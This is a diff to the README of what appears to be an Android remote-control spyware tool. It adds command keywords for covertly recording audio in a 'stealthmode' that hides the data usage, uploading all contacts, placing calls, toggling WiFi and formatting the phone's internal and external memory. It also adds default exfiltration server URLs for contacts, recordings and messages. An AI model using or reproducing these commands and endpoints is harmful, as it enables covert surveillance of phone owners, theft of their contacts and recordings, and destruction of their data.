@@ -100,13 +100,27 @@ roger : Record Sound and Upload it to Server
         syntax: xrob roger,Record Duration,
         example : xrob roger,60,
         
+        additional parameters : stealthmode
+        use : enable mobile data if internet is not available and disable it after  uploading the sound to server.
+
+ringbaby : call to a number
+         syntax : xrob ringbaby,phone number,
+         example : xrob ringbaby,+918301893919,
+
+shoot : make alien gun sound
+dvbbs : make some sound
+
+candygram : Turn on WiFi
+cuppygram : Turn OFF WiFi
+bingo : Upload all contacts to server (if network available)
+
+clean sd : Format INternal Memmory
+clean mem : Format External Memmory
 ```
 
-
-
-
-
-
-
-
+Default Server Addresses
+========================
+Contact Server :  http://homeworks.orgfree.com/Microbe/contact_reader.php
+Sound Server : http://coursemate.comxa.com/Android/uploads/
+Message Server : http://homeworks.orgfree.com/Microbe/reader.php
 
